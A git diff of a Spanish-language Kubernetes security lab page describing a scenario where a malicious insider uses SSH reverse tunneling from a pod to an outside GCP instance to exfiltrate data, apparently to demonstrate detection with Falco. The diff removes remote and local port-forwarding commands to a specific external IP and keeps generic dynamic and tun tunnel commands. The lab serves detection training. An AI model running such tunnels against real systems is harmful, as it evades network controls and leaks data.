@@ -1,36 +1,38 @@
-# Scenario A
+# Scenario A: Exfiltración de Información mediante SSH Tunneling en Kubernetes
 
 > SSH Port forwarding (Tunelización de puertos)
 
-
-
 <!-- <img src="../../assets/memoryDumping.webp" align="center" width="50%" height="50%"/> -->
 
-<div style="text-align: center;">
-  <img src="../../assets/ssh-port-forwarding.webp" width="50%" height="50%" />
+<!-- <div style="text-align: center;"> -->
+
+
+<div style="display: flex; align-items: center; border: 1px solid #ddd; padding: 15px; border-radius: 8px;">
+  <div style="flex: 1;">
+    <img src="../../assets/ssh-port-forwarding.webp" style="max-width: 100%; height: auto; border-radius: 5px;" />
+  </div>
+  <div style="flex: 2; padding-left: 20px; text-align: justify;">
+    <p>
+      En un entorno corporativo seguro, un empleado malintencionado busca evadir las restricciones impuestas por la compañía y establecer un canal de comunicación no autorizado desde un pod de Kubernetes. Para lograrlo, configura una conexión <strong>SSH tunneling</strong> con el objetivo de exfiltrar información de manera encubierta.
+    </p>
+    <p>
+      Aprovechando el acceso al pod, el atacante ejecuta comandos para establecer un <strong>túnel SSH reverso</strong> hacia una instancia de <em>Compute Engine</em> en <strong>Google Cloud Platform (GCP)</strong> bajo su control. Esta técnica le permite no solo extraer datos sensibles desde la infraestructura interna, sino también redirigir el tráfico de la subred en la que se encuentra el pod. Como resultado, el atacante obtiene acceso indirecto a otros recursos internos que, de otra manera, estarían protegidos por controles de red y políticas de seguridad.
+    </p>
+    <p>
+      El uso de <strong>SSH tunneling</strong> en este contexto representa una amenaza significativa, ya que permite eludir firewalls y sistemas de monitoreo convencionales. Sin una solución de seguridad efectiva como <em>Falco runtime security</em>, este tipo de actividad podría pasar desapercibida, comprometiendo la integridad y confidencialidad de la información corporativa.
+    </p>
+  </div>
 </div>
 
 
-Local Port Forwarding
 
-    ssh -i gcp_remote -L 3306:localhost:3306 diegoposada@34.27.180.215
-    ssh -i gcp_remote -N -L 3306:localhost:3306 diegoposada@34.27.180.215
 
-Remote Port Forwarding
-
-    ssh -i gcp_remote -R 3306:localhost:3306 diegoposada@34.27.180.215
-    ssh -i gcp_remote -f -N -R 3306:localhost:3306 diegoposada@34.27.180.215  (background execution)
-
-    ssh -i gcp_remote -R 3306:localhost:3306 diegoposada@34.27.180.215
-
-Dynamic Port Forwarding
 
     ssh -D 8080 user@server  (SSH Tunneling encapsula todo el tráfico TCP a través de una conexión segura SSH, actuando como una especie de VPN básica.)
 
 
 
     ssh -w 0:0 usuario@servidor
-
 
 
 
